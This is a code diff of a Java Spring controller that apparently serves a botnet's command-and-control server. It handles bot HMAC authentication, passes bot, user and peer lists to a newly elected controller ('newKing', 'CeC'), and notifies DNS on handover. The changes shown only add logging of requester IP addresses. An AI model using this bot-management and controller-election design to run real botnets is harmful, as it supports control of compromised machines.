@@ -42,7 +42,8 @@ public class CommandController {
 
 	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
 	@ResponseBody
-	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error) throws IOException {
+	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error,HttpServletRequest req) throws IOException {
+		System.out.println("Richiesta di challenge ricevuta da " + req.getRemoteAddr());
 		System.out.println("1");
 		Pairs<Long, Integer> response = new Pairs<>();
 		if (configEngine.isCommandandconquerStatus()) {
@@ -57,8 +58,8 @@ public class CommandController {
 
 	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
 	@ResponseBody
-	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
-			HttpServletRequest request) throws IOException {
+	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,HttpServletRequest req) throws IOException {
+		System.out.println("Richiesta con hmac ricevuta da " + req.getRemoteAddr());
 		String response = "";
 		if (configEngine.isCommandandconquerStatus()) {
 			response = cmm.checkHmac(objects);
@@ -94,7 +95,8 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/roles", method = RequestMethod.POST)
 	@ResponseBody
-	public List<Role> newKingRoles(@RequestBody String idBot) {
+	public List<Role> newKingRoles(@RequestBody String idBot,HttpServletRequest req) {
+		System.out.println("Richiesta RUOLI del database da " + req.getRemoteAddr());
 		System.out.println("id b"+ idBot);
 		System.out.println("id b2"+ cmm.getpServ().getNewKing());
 		System.out.println("id b3"+ cmm.getpServ().getNewKing().equals(idBot));
@@ -111,7 +113,8 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/bots", method = RequestMethod.POST)
 	@ResponseBody
-	public List<Bot> newKingBots(@RequestBody String idBot) {
+	public List<Bot> newKingBots(@RequestBody String idBot,HttpServletRequest req) {
+		System.out.println("Richiesta BOT del database da " + req.getRemoteAddr());
 		List<Bot> response = new ArrayList<Bot>();
 		// Bot
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -123,7 +126,8 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/users", method = RequestMethod.POST)
 	@ResponseBody
-	public List<User> newKingUsers(@RequestBody String idBot) {
+	public List<User> newKingUsers(@RequestBody String idBot,HttpServletRequest req) {
+		System.out.println("Richiesta USERS del database da " + req.getRemoteAddr());
 		List<User> response = new ArrayList<User>();
 		// User
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -134,7 +138,8 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/peers", method = RequestMethod.POST)
 	@ResponseBody
-	public List<String> newKingPeers(@RequestBody String idBot) {
+	public List<String> newKingPeers(@RequestBody String idBot,HttpServletRequest req) {
+		System.out.println("Richiesta PEERS del database da " + req.getRemoteAddr());
 		List<String> response = new ArrayList<String>();
 		// User
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -154,7 +159,8 @@ public class CommandController {
 
 	@RequestMapping(value = "/newKing/ready", method = RequestMethod.POST)
 	@ResponseBody
-	public boolean newKingReady(@RequestBody String idBot) {
+	public boolean newKingReady(@RequestBody String idBot,HttpServletRequest req) {
+		System.out.println("Richiesta di conferma passaggio di poteri da" + req.getRemoteAddr());
 		// avvisa dns
 		if (!cmm.getpServ().getNewKing().equals(idBot))
 			return false;
@@ -167,7 +173,8 @@ public class CommandController {
 	// TODO RIMUOVERE TEST
 	@RequestMapping(value = "/election", method = RequestMethod.GET)
 	@ResponseBody
-	public boolean startElection() {
+	public boolean startElection(HttpServletRequest req) {
+		System.out.println("Richiesta di elezione di un nuovo CeC da " + req.getRemoteAddr());
 		if (configEngine.isCommandandconquerStatus()) {
 			cmm.startElection();
 		}
